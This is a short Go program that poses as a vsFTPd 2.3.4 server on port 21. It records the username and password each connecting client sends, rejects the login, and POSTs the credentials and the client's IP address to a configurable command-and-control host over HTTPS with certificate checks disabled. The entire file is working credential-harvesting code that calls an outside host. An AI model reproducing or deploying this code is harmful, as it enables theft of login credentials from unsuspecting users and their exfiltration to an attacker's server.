package main

import (
	"bufio"
	"bytes"
	"net"
	"crypto/tls"
	"net/http"
	"net/url"
	"time"
)

var (
	c2Server string
)

func httpsClient() *http.Client {
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{
                                InsecureSkipVerify: true,
                        },
                },
                Timeout: time.Second * 10,
        }
        return client
}

func getRequest(path string) error {
        client := httpsClient()
        resp, err := client.Get("https://" + path)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        return nil
}

func callHome(form url.Values) (error) {
	client := httpsClient()
	_ = getRequest(c2Server)
	formBody := bytes.NewBufferString(form.Encode())
	resp, err := client.Post("https://" + c2Server, "application/x-www-form-urlencoded", formBody)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}


func handleAuth(conn net.Conn) {
	defer conn.Close()
	r := bufio.NewReader(conn)
	conn.Write([]byte("220 vsFTPd 2.3.4" + "\n"))
	user, err := r.ReadString('\n')
	if err != nil {
		return
	}
	//smtp uses code 503
	conn.Write([]byte("331 not logged in" + "\n"))
	pass, err := r.ReadString('\n')
	if err != nil {
		return
	}
	//smtp uses code 530
	conn.Write([]byte("430 Invalid username or password" + "\n"))
	_, err = r.ReadString('\n')
	if err != nil {
		return
	}
	byteUser := bytes.Replace([]byte(user), []byte("USER "), []byte(""), 1)
	byteUser = bytes.Replace(byteUser, []byte("\r\n"), []byte(""), 1)
	user = string(byteUser)
	bytePass := bytes.Replace([]byte(pass), []byte("PASS "), []byte(""), 1)
	bytePass = bytes.Replace(bytePass, []byte("\r\n"), []byte(""), 1)
	pass = string(bytePass)
	form := url.Values {
		"connection": {"FTP"},
		"remote_ip": {conn.RemoteAddr().String()},
		"user": {user},
		"pass": {pass},
	}
	_ = callHome(form)
}

func main() {
	// Listen for incoming connections.
	l, _ := net.Listen("tcp", ":21")
	// Close the listener when the application closes.
	defer l.Close()
	for {
		conn, err := l.Accept()
		if err != nil {
			break
		}
		go handleAuth(conn)
	}
}
